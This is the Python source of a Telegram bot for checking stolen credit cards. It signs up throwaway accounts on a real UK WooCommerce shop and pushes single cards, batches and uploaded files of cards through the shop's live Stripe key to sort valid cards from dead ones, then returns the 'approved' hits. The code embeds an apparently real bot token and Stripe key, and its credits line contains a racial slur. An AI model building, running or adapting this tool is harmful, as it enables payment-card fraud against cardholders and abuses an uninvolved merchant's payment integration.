import telebot, requests, random, string, time, re, os, user_agent, threading
from threading import Thread, Event
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

bot = telebot.TeleBot('7661872116:AAE0oJ-N1Na2EguFrnB1DRZ5SDb2vYKJSaQ', parse_mode='Markdown', disable_web_page_preview=True) # change "YOUR BOT TOKEN HERE" with your bot token 
stop_events = {}
ongoing_mchk = {}
user_states = {}
gids_file = "gids.txt"
uids_file = 'uids.txt'
owner = [id] # your id
admin_ids = [id] # admins id here

def load_ids():
    user_ids = []
    group_ids = []
    
    if os.path.exists(uids_file):
        with open(uids_file, 'r') as file:
            user_ids = [int(line.strip()) for line in file.readlines() if line.strip().isdigit()]
    
    if os.path.exists(gids_file):
        with open(gids_file, 'r') as file:
            group_ids = [int(line.strip()) for line in file.readlines() if line.strip().isdigit()]
    
    return user_ids, group_ids

def save_id(user_id=None, group_id=None):
    if user_id is not None:
        with open(uids_file, 'a') as file:
            file.write(f"{user_id}\n")
    
    if group_id is not None:
        with open(gids_file, 'a') as file:
            file.write(f"{group_id}\n")

def registerhim(message):
    chat_type = message.chat.type
    chat_id = message.chat.id
    uids, gifs = load_ids()
    
    if chat_type == 'private' and chat_id not in uids:
        save_id(user_id=chat_id)
    elif chat_type in ['group', 'supergroup', 'channel'] and chat_id not in uids:
        save_id(group_id=chat_id)

def generate_user_agent():
    return user_agent.generate_user_agent()

def gen():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "example.com"]
    email_prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"{email_prefix}@{random.choice(domains)}"
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choices(characters, k=12))
    return email, password


def get_bininfo(bin):
    try:
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin}")
        if response.status_code != 200:
            return None, f"Failed to fetch BIN info: {response.status_code}"
        bin_data = response.json()
        return bin_data, None
    except Exception as e:
        return None, f"Error fetching BIN info: {str(e)}"

def process_single_cc(card, firstname, username):
    try:
        cc, month, year, cvv = re.split(r'[\|\-\/\,\+\ \!\•]', card)
    except ValueError:
        return f"{card}\n❌ Invalid card Format.\nSupported '|', '-', '/', ',', '+', ' ', '!', '•'", "❌ INVALID FORMAT", "DEAD ❌"
    start_time = time.time()
    firstname = firstname.replace('[', '').replace(']', '').replace("(", "").replace(")", "")
    bin = cc[:6]
    bin_data, bin_error = get_bininfo(bin)
    r = requests.session()
    email, passwd = gen()
    if bin_error:
        bin_info = f""
    else:
        eco = bin_data.get("country_currencies")
        if len(eco) == 1:
            ecolist = eco[0]
        elif len(eco) < 1:
            ecolist = "N/A"
        else:
            ecolist = ", ".join(eco)
        bin_info = (
        f"\n「[↯](teamdarkxd.t.me)」*Bin*: `{bin}`\n"
        f"「[↯](VICTUSxGOD.t.me.t.me)」*Info*: {bin_data.get('brand', 'N/A').upper()} - {bin_data.get('type', 'N/A').upper()} - {bin_data.get('level', 'N/A').upper()}\n"
        f"「[↯](ccnhub.t.me)」*Iusser*: {bin_data.get('bank', 'N/A')}\n"
       f"「[↯](teamdarkxd.t.me)」*Country*: {bin_data.get('country', 'N/A').upper()} - {bin_data.get('country_name', 'N/A').upper()} {bin_data.get('country_flag', '')}\n"
       f"「[↯](VICTUSxGOD.t.me.t.me)」*Currency*: {ecolist}\n"
       )
       
    try:
        user = user_agent.generate_user_agent()
        email, passwd = gen()
        headers = {
            'user-agent': user,
        }
        response = r.get('https://truesignage.co.uk/my-account/edit-address/billing/', headers=headers)
        rnonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
        
        headers = {
    'authority': 'truesignage.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://truesignage.co.uk',
    'referer': 'https://truesignage.co.uk/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = {
    'email': email,
    'email_2': email,
    'woocommerce-register-nonce': rnonce,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'register': 'Register',
        }

        response = r.post('https://truesignage.co.uk/my-account/edit-address/billing/', headers=headers, data=data)
        addnonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)
        
        headers = {
    'authority': 'truesignage.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://truesignage.co.uk',
    'referer': 'https://truesignage.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        params = {
    '_wc_user_reg': 'true',
        }

        data = {
    'billing_first_name': 'Shadow',
    'billing_last_name': 'Pro',
    'billing_company': '',
    'billing_country': 'GB',
    'billing_address_1': '94 Princes Street',
    'billing_address_2': '',
    'billing_city': 'Romannobridge',
    'billing_state': '',
    'billing_postcode': 'EH461ZJ',
    'billing_phone': '077 8526 8433',
    'billing_email': email,
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': addnonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'action': 'edit_address',
        }

        response = r.post(
    'https://truesignage.co.uk/my-account/edit-address/billing/',
    params=params,
    headers=headers,
    data=data,
        )

        headers = {
    'authority': 'truesignage.co.uk',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'referer': 'https://truesignage.co.uk/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        response = r.get('https://truesignage.co.uk/my-account/add-payment-method/', headers=headers)
        
        nonceop=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]

        headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'priority': 'u=1, i',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        data = {
        'referrer': 'https://truesignage.co.uk',
        'type': 'card',
        'owner[name]': ' ',
        'owner[email]': 'discord9992624@gmail.com',
        'card[number]': cc,
        'card[exp_month]': month,
        'card[exp_year]': year,
        'card[cvc]': cvv,
        'key': 'pk_live_51LFabqJxahCuwhEcz8b3l7974Bw3iSwXFzgwK5pJrxnW1DXXYmHtUUW8HZW59xS1zNAITm6l3URpG2ghKzk8BDjG00yjqwbi93',
        }

        response = r.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
        if "error" in response.json():
            responsj = response.json()
            end_time = time.time()
            time_taken = round(end_time - start_time, 2)
            errorj = responsj.get("error")
            error = errorj.get("message", "N/A")
            code = errorj.get("code", "N/A")
            if code == 'invalid_cvc':
                return (
                    f"🌟 *CCN ☑️*\n\n"
                    f"「[↯](teamdarkxd.t.me)」*CARD:* `{card}`\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Status:* CCN ✅\n"
                    f"「[↯](ccnhub.t.me)」*Gateway:* STRIPE AUTH\n"
                    f"「[↯](teamdarkxd.t.me)」*Response:* ✅ {error}「 {code} 」\n"
                    f"{bin_info}\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Time Taken:* {time_taken} seconds\n"
                    f"「[↯](ccnhub.t.me)」*Checked By:* [{firstname}](t.me/{username})\n"
                    f"「[↯](teamdarkxd.t.me)」*Developed by:* [НИГГЕР](poolofsex.t.me)"
            ), f"✅ {error}「 {code} 」", "CCN ✅"
            else:
                 return (
                    f"❌ *DECLINED ❌*\n\n"
                    f"「[↯](teamdarkxd.t.me)」*CARD:* `{card}`\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Status:* DEAD ❌\n"
                    f"「[↯](ccnhub.t.me)」*Gateway:* STRIPE AUTH\n"
                    f"「[↯](teamdarkxd.t.me)」*Response:* ❌ {error}「 {code} 」\n"
                    f"{bin_info}\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Time Taken:* {time_taken} seconds\n"
                    f"「[↯](ccnhub.t.me)」*Checked By:* [{firstname}](t.me/{username})\n"
                    f"「[↯](teamdarkxd.t.me)」*Developed by:* [НИГГЕР](poolofsex.t.me)"
            ), f"❌ {error}「 {code} 」", "DEAD ❌"

        scrop= response.json()['id']
        scrlong = response.json()['client_secret']

        headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://truesignage.co.uk',
        'priority': 'u=1, i',
        'referer': 'https://truesignage.co.uk/my-account/add-payment-method/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        }

        params = {
        'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data = {
        'stripe_source_id': scrop,
        'nonce': nonceop,
        }

        response = r.post('https://truesignage.co.uk/', params=params, headers=headers, data=data, verify=False)
    
        end_time = time.time()
        time_taken = round(end_time - start_time, 2)
        rj = response.json()
        if rj['status'] == 'error':
            if ('Your card does not support this type of purchase.' in rj['error']['message'] or 'This transaction requires authentication.' in rj['error']['message']):
                return (
                    f"🌟 *APPROVED ✅*\n\n"
                    f"「[↯](teamdarkxd.t.me)」*CARD:* `{card}`\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Status:* LIVE ✅\n"
                    f"「[↯](ccnhub.t.me)」*Gateway:* STRIPE AUTH\n"
                    f"「[↯](teamdarkxd.t.me)」*Response:* ✅ {rj['error']['message']}\n"
                    f"{bin_info}\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Time Taken:* {time_taken} seconds\n"
                    f"「[↯](ccnhub.t.me)」*Checked By:* [{firstname}](t.me/{username})\n"
                    f"「[↯](teamdarkxd.t.me)」*Developed by:* [НИГГЕР](poolofsex.t.me)"
            ), f"✅ {rj['error']['message']}", "LIVE ✅"
            elif "security code is incorrect" in rj['error']['message']:
            	return (
                    f"🌟 *CCN ☑️*\n\n"
                    f"「[↯](teamdarkxd.t.me)」*CARD:* `{card}`\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Status:* CCN ✅\n"
                    f"「[↯](ccnhub.t.me)」*Gateway:* STRIPE AUTH\n"
                    f"「[↯](teamdarkxd.t.me)」*Response:* `☑️ {rj['error']['message']}`\n"
                    f"{bin_info}\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Time Taken:* {time_taken} seconds\n"
                    f"「[↯](ccnhub.t.me)」*Checked By:* [{firstname}](t.me/{username})\n"
                    f"「[↯](teamdarkxd.t.me)」*Developed by:* [НИГГЕР](poolofsex.t.me)"
            ), f"☑️ {rj['error']['message']}", "CCN ✅"
            else:
                return (
                    f"❌ *DECLINED ❌*\n\n"
                    f"「[↯](teamdarkxd.t.me)」*CARD:* `{card}`\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Status:* DEAD ❌\n"
                    f"「[↯](ccnhub.t.me)」*Gateway:* STRIPE AUTH\n"
                    f"「[↯](teamdarkxd.t.me)」*Response:* `❌ {rj['error']['message']}`\n"
                    f"{bin_info}\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Time Taken:* {time_taken} seconds\n"
                    f"「[↯](ccnhub.t.me)」*Checked By:* [{firstname}](t.me/{username})\n"
                    f"「[↯](teamdarkxd.t.me)」*Developed by:* [НИГГЕР](poolofsex.t.me)"
            ), f"❌ {rj['error']['message']}", "DEAD ❌"
        else:
            return (
                    f"🌟 *APPROVED ✅*\n\n"
                    f"「[↯](teamdarkxd.t.me)」*CARD:* `{card}`\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Status:* *APPROVED* ✅\n"
                    f"「[↯](ccnhub.t.me)」*Gateway:* STRIPE AUTH\n"
                    f"「[↯](teamdarkxd.t.me)」*Response:* `✅ New Payment Method Added.`\n"
                    f"{bin_info}\n"
                    f"「[↯](VICTUSxGOD.t.me.t.me)」*Time Taken:* {time_taken} seconds\n"
                    f"「[↯](https://ccnhub.t.me)」*Checked By:* [{firstname}](https://t.me/{username})\n"
                    f"「[↯](teamdarkxd.t.me)」*Developed by:* [НИГГЕР](poolofsex.t.me)"
            ), f"✅ New Payment Method Added.", "*APPROVED* ✅" 
    except Exception as e:
        return (
            f"*💢 ERROR 💢*\n\n"
           f"「[↯](teamdarkxd.t.me)」*CARD:* `{cc}`\n"
            f"「[↯](VICTUSxGOD.t.me.t.me)」*Status:* 💢 ERROR\n"
            f"「[↯](ccnhub.t.me)」*Error:* `💢 {str(e)}`\n"
            f"「[↯](ccnhub.t.me)」*Checked By:* [{firstname}](t.me/{username})\n"
           f"「[↯](teamdarkxd.t.me)」*Developed by:* [НИГГЕР](poolofsex.t.me)"
        ), f"💢 {str(e)}", "💢 ERROR"

@bot.message_handler(commands=['addadmin'])
def addAdmin(message):
    if message.from_user.id not in owner:
        bot.reply_to(message, "❌ *You Don't have permissions to use this command*.")
        return
    id = message.text.split()[1]
    if id in admin_ids:
        bot.reply_to(message, "❌ *He is Already Admin")
        return
    admin_ids.append(id)
    bot.reply_to(message, "✅ *User Promoted to Admin Successfuly*")

@bot.message_handler(commands=['radmin'])
def addAdmin(message):
    if message.from_user.id not in owner:
        bot.reply_to(message, "❌ *You Don't have permissions to use this command*.")
        return
    id = message.text.split()[1]
    if id not in admin_ids:
        bot.reply_to(message, "❌ *He is not a Admin*")
        return
    admin_ids.remove(id)
    bot.reply_to(message, "✅ *Admin demoted to User Successfuly*")

@bot.message_handler(commands=['sendinfo'])
def send_files(message):
    if message.from_user.id not in admin_ids or message.from_user.id not in owner:
        bot.reply_to(message, "❌ *You Don't have permissions to use this command*.")
        return

    try:
        with open('gids.txt', 'r') as file:
            gids_lines = file.readlines()
        with open('uids.txt', 'r') as file:
            uids_lines = file.readlines()
        
        gids_line_count = len(gids_lines)
        uids_line_count = len(uids_lines)
        
        # Send the gids.txt file with caption
        bot.send_document(
            message.chat.id, 
            open('gids.txt', 'rb'),
            caption=f"Total {gids_line_count} Group, Channel IDs"
        )
        
        bot.send_document(
            message.chat.id, 
            open('uids.txt', 'rb'),
            caption=f"Total {uids_line_count} user IDS."
        )
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {e}")

# /start command
@bot.message_handler(commands=['start'])
def start(message):
    registerhim(message)
    bot.reply_to(message, "🚀 Welcome to the Stripe Auth CC Checker Bot!\nUse /help to see available commands. 🌟")

@bot.message_handler(commands=['anno'])
def announce(message):
    if message.from_user.id not in admin_ids or message.from_user.id not in owner:
        bot.reply_to(message, "❌ *You Don't have permissions to use this command*.")
        return
    
    if not message.reply_to_message:
        bot.reply_to(message, "❌ Invalid usage.")
        return

    reply_message = message.reply_to_message
    user_ids, group_ids = load_ids()

    for user_id in user_ids:
        try:
            if reply_message.text:
                bot.send_message(user_id, reply_message.text)
            elif reply_message.photo:
                bot.send_photo(user_id, reply_message.photo[-1].file_id, caption=reply_message.caption)
            elif reply_message.video:
                bot.send_video(user_id, reply_message.video.file_id, caption=reply_message.caption)
            elif reply_message.audio:
                bot.send_audio(user_id, reply_message.audio.file_id, caption=reply_message.caption)
            elif reply_message.document:
                bot.send_document(user_id, reply_message.document.file_id, caption=reply_message.caption)
            elif reply_message.sticker:
                bot.send_sticker(user_id, reply_message.sticker.file_id)
            elif reply_message.animation:
                bot.send_animation(user_id, reply_message.animation.file_id)
        except Exception as e:
            print(f"Could not send to user {user_id}: {e}")

    for group_id in group_ids:
        try:
            if reply_message.text:
                bot.send_message(group_id, reply_message.text)
            elif reply_message.photo:
                bot.send_photo(group_id, reply_message.photo[-1].file_id, caption=reply_message.caption)
            elif reply_message.video:
                bot.send_video(group_id, reply_message.video.file_id, caption=reply_message.caption)
            elif reply_message.audio:
                bot.send_audio(group_id, reply_message.audio.file_id, caption=reply_message.caption)
            elif reply_message.document:
                bot.send_document(group_id, reply_message.document.file_id, caption=reply_message.caption)
            elif reply_message.sticker:
                bot.send_sticker(group_id, reply_message.sticker.file_id)
            elif reply_message.animation:
                bot.send_animation(group_id, reply_message.animation.file_id)
        except Exception as e:
            print(f"Could not send to group {group_id}: {e}")

    bot.reply_to(message, f"✅ Announcement sent to {len(user_ids)} users and {len(group_ids)} groups.")

# /help command
@bot.message_handler(commands=['help'])
def help_command(message):
    registerhim(message)
    bot.reply_to(message, "🛠️ *Available Commands:*\n\n/chk [card] - Check a single CC\n/mchk [cards] - Check multiple CCs\n/chktxt - Check multiple CCs via file ( Note: To Use HitSender in /chktxt use '/chktxt y'\n/stop - Stop on going chktxt")

# /chk command (Check single card)
@bot.message_handler(commands=['chk'])
def check_cc(message):
    registerhim(message)
    try:
        cc = message.text.split()[1]
        msg = bot.reply_to(message, "*Processing your CC* 💳")
        result = process_single_cc(cc, message.from_user.first_name, message.from_user.username)
        bot.edit_message_text(chat_id=message.chat.id, message_id=msg.id, text=result)
    except IndexError:
        bot.reply_to(message, "❌ Invalid format. Use: `/chk 4934740000721153|10|2027|817`")

# /mchk ( check multiple cards )
@bot.message_handler(commands=['mchk'])
def check_mass_cc(message):
    registerhim(message)
    try:
        if message.reply_to_message:
            ccs = message.reply_to_message.text.split('\n')
        else:
            lines = message.text.split('\n')
            first_line_parts = lines[0].split(' ')
            
            if len(first_line_parts) < 2:
                raise IndexError
            
            ccs = [first_line_parts[1]]
            
            if len(lines) > 1:
                ccs.extend(lines[1:])
        
        if not ccs:
            raise IndexError
        
        if len(ccs) < 5:
            bot.reply_to(message, "*ERROR:* Please provide at least 5 cards.")
            return
        if len(ccs) > 25:
            bot.reply_to(message, "*ERROR:* Maximum limit of 25 cards reached.")
            return
        
        start_time = time.time()
        msg = bot.reply_to(message, f"*Processing {len(ccs)} cards...*")
        uh = f"↯ *MASS Stripe Auth* [[/mchk]]\n*CARDS:* [[{len(ccs)} / 25]]\n\n"
        
        for cc in ccs:
            n, uhh, status = process_single_cc(cc.strip(), message.from_user.first_name, message.from_user.username)
            uh += f"`{cc.strip()}`\n*Status:* {status}\n*Result:* `{uhh}`\n\n"
            bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.id, text=uh)
        
        end_time = time.time()
        time_taken = round(end_time - start_time, 2)
        uh += (f"「[↯](teamdarkxd.t.me)」*Time Taken:* {time_taken} seconds\n"
               f"「[↯](VICTUSxGOD.t.me)」*Checked By:* [{message.from_user.first_name}]"
               f"([t.me/{message.from_user.username}])\n"
               f"「[↯](ccnhub.t.me)」*Developed by:* [НИГГЕР](poolofsex.t.me)")
        
        bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.id, text=uh)
    except IndexError:
        bot.reply_to(message, "❌ Invalid format. Use:\n/mchk 4934740000721153|10|2027|817\n4111111111111111|12|2026|123")

# /chktxt command (Check multiple cards from txt)
@bot.message_handler(commands=['chktxt'])
def multi_check_cc(message):
    registerhim(message)
    user_id = message.from_user.id

    if ongoing_mchk.get(user_id):
        bot.send_message(
            message.chat.id,
            "⚠️ You already have an ongoing mass check. Use /stop to stop it."
        )
        return

    args = message.text.split(maxsplit=1)
    sendhit = args[1].strip().lower() if len(args) > 1 and args[1] else None

    if sendhit in ["y", "yes", "t", "true"]:
        hit = "yeah"
    else:
        hit = "nope"

    msgts = "📄 Please send the text file containing CCs now."
    if hit == 'yeah':
        msgts += "\n\n*HitSender ON 🔥*"

    bot.reply_to(
        message,
        msgts
    )

    user_states[user_id] = {
        "status": "awaiting_file",
        "approved": 0,
        "declined": 0,
        "cards": [],
        "hit": hit
    }
    ongoing_mchk[user_id] = True

def multi_check_thread(message, user_id, cc_list, msg, buttons, firstname, username, sendhit=False):
    approved_cards = []
    sendfile = True 
    user_stop_event = stop_events.get(user_id, threading.Event())
    try:
        for cc in cc_list:
            if user_stop_event.is_set():
                sendfile = False
                break

            try:
                resp, result, status = process_single_cc(cc, firstname, username)
                if not result or not resp:
                    raise ValueError(f"Invalid response from Gate\n\n{result}\n\n{resp}")
            except Exception as e:
                bot.send_message(message.chat.id, f"Error while checking card: {cc}, Error: {str(e)}")
                continue

            if "✅" in resp:
                user_states[user_id]["approved"] += 1
                with open(f"{user_id}_approve.txt", "a") as f:
                    f.write(f"{cc}\n- Result - {result}\n")
                if sendhit:
                    bot.send_message(message.chat.id, resp)
                approved_cards.append(f"{cc}\n- Result - {result}\n")
            elif '💢' in resp:
                bot.send_message(message.chat.id, resp)
                user_states[user_id]["declined"] += 1
            else:
                user_states[user_id]["declined"] += 1

            buttons[0][0].text = f"- {cc} -"
            buttons[1][0].text = f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {result}"
            buttons[2][0].text = f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅: {user_states[user_id]['approved']}"
            buttons[3][0].text = f"𝐃𝐞??𝐥𝐢𝐧𝐞𝐝 ❌: {user_states[user_id]['declined']}"
            markup = InlineKeyboardMarkup(buttons)
            bot.edit_message_reply_markup(message.chat.id, msg.id, reply_markup=markup)
    except Exception as e:
        bot.send_message(user_id, f"❌ Error during processing: {str(e)} - in multi check")
    finally:
        ongoing_mchk.pop(user_id, None)
        user_stop_event.clear()
    if sendfile and approved_cards:
        with open(f"{user_id}_approve.txt", "rb") as f:
            bot.send_document(message.chat.id, f, caption=f"*TOTAL {len(approved_cards)} APPROVES!*", parse_mode="Markdown")
        os.remove(f"{user_id}_approve.txt")

@bot.message_handler(commands=['stop'])
def stop_processing(message):
    registerhim(message)
    user_id = message.from_user.id
    user_stop_event = stop_events.setdefault(user_id, threading.Event())
    if user_stop_event.is_set() or ongoing_mchk.get(user_id):
        user_stop_event.set()
        msgte = bot.reply_to(message, "⏹️ Stopping ongoing process...")
        if os.path.exists(f"{user_id}_approve.txt"):
            with open(f"{user_id}_approve.txt", 'rb') as f:
                bot.delete_message(message.chat.id, msgte.id)
                bot.send_document(message.chat.id, f, caption=f"*STOPPED SUCCESSFUL*\n*Here your approved cards*", parse_mode="MarkdownV2")
                os.remove(f"{user_id}_approve.txt")
        else:
            bot.edit_message_text(chat_id=message.chat.id, message_id=msgte.id, text="*STOPPED SUCCESSFUL*\n*Sadly no approved cards found*")
    else:
        bot.reply_to(message, "⚠️ There is no ongoing mass check to stop.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    registerhim(message)
    user_id = message.from_user.id
    user_state = user_states.get(user_id, {})
    if user_state.get("status") != "awaiting_file":
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        cc_list = downloaded_file.decode('utf-8').strip().splitlines()
        if len(cc_list) > 700:
            bot.reply_to(message, "*ERROR*: Sorry. you can only check 700 cards most")
            return
        user_states[user_id]["cards"] = cc_list
        hit = user_state.get("hit")
        user_states[user_id]["status"] = "processing"

        buttons = [
            [InlineKeyboardButton("- Processing -", callback_data="card")],
            [InlineKeyboardButton("𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Processing", callback_data="response")],
            [InlineKeyboardButton(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅: {user_states[user_id]['approved']}", callback_data="approved")],
            [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {user_states[user_id]['declined']}", callback_data="declined")],
            [InlineKeyboardButton(f"𝐓𝐨𝐭𝐚𝐥 𝐂𝐚𝐫𝐝𝐬: {len(cc_list)}", callback_data="total")],
        ]
        markup = InlineKeyboardMarkup(buttons)
        stop_events[user_id] = threading.Event()
        msgts = "*Processing your Cards...*\n\nUse /stop to stop checking. don't worry you will get approved ccs:)"
        if hit == "yeah":
            msgts += "\n*Hit Sender ON 🔥*"
        msg = bot.send_message(message.chat.id, msgts, reply_markup=markup)
        Thread(target=multi_check_thread, args=(message, user_id, cc_list, msg, buttons, message.from_user.first_name, message.from_user.username, hit == "yeah"), daemon=True).start()
    except Exception as e:
        bot.send_message(user_id, f"❌ Error during processing: {e} - In Handle File")

# Start polling
bot.polling()























